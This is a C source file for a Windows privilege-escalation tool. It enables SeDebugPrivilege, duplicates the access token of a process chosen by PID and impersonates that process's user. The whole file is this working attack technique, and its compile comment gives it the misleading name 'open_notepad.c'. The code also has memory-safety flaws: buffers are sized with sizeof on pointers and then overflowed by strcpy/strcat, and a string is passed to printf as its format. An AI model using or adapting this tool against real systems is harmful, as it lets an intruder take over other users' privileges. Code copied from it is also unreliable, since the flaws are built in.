#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "doexec.h"

// Compile with gcc open_notepad.c -o open_notepad -ladvapi32
HANDLE OpenProcessWithToken(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess error: %u\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
        printf("[-] DuplicateTokenEx error: %u\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    return hDuplicatedToken;
}

char *name(){
    char username[256]; 
    DWORD username_len = sizeof(username);  // Length of the buffer
    char *result;
    char *intro = "[+] Current user: ";
    memset(username, 0, 256);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len)) {
       result = malloc(sizeof(intro) + sizeof(username) + 3);
       strcpy(result, intro);
       strcat(result, username);
       strcat(result, "\r\n");
    } else {    
        char *fail = "Failed to get username.\r\n";
        result = malloc(sizeof(fail));
        strcpy(result, fail);
    }

    return result;
}

char *impersonate(int pid){
    char *first_user = name();
    HANDLE hToken = OpenProcessWithToken(pid);
    char *open = "[-] Failed to obtain duplicated token.\r\n";
    char *new_user = name();
    char *impersonateStr = "[+] Impersonated new user.\r\n";
    if (hToken) {
        open = "[+] Successfully obtained duplicated token.\r\n";

        // Impersonate the user
        if (!ImpersonateLoggedOnUser(hToken)) {
            impersonateStr = "[-] ImpersonateLoggedOnUser error.";
            CloseHandle(hToken);
        }

        new_user = name();
        RevertToSelf();
        CloseHandle(hToken);
    }

    char *result = malloc(sizeof(first_user) + sizeof(open) + sizeof(impersonateStr) + sizeof(new_user) + 4); 
    strcpy(result, first_user);
    strcat(result, open);
    strcat(result, impersonateStr);
    strcat(result, new_user);

    return result;
}

char *EnableDebugPrivilege() {
    HANDLE hToken;
    char *result;
    char *failedProc = "[-] OpenProcessToken error\r\n";
    char *lookupError = "[-] LookupPrivilegeValue error\r\n";
    char *adjustError = "[-] AdjustTokenPrivileges error\r\n";
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        result = malloc(sizeof(failedProc) + 1);
        strcpy(result, failedProc);
        return result;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        result = malloc(sizeof(lookupError) + 1);
        strcpy(result, lookupError);
        return result;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        result = malloc(sizeof(adjustError) + 1);
        strcpy(result, adjustError);
        return result;
    }
    CloseHandle(hToken);
    
    char *goodProc = "[+] Local process token opened.\r\n";
    char *goodLookup = "[+] Privilege list recived.\r\n";
    char *goodAdjust = "[+] Debug privilege enable.\r\n";
    int len = strlen(goodProc) + strlen(goodLookup) + strlen(goodAdjust);
    int size = len * sizeof(char);
    result = malloc(size + 1);
    strcpy(result, goodProc);
    strcat(result, goodLookup);
    strcat(result, goodAdjust);
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    EnableDebugPrivilege();
    DWORD pid = atoi(argv[1]);
    char *hello = impersonate(pid);
    printf(hello);
    return 0;
}